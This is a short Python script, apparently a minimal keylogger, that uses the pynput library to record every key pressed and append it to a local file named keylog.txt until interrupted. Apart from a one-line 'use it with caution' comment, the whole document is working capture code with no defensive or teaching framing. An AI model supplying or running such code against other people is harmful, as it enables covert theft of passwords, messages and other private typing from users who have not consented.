# no gui, use it with caution

from pynput.keyboard import Listener


def log_key(key):
    key = str(key).replace("'", "")
    with open("keylog.txt", "a") as file:
        file.write(key + "\n")


listener = Listener(on_press=log_key)

try:
    listener.start()
    listener.join()
except KeyboardInterrupt:
    listener.stop()
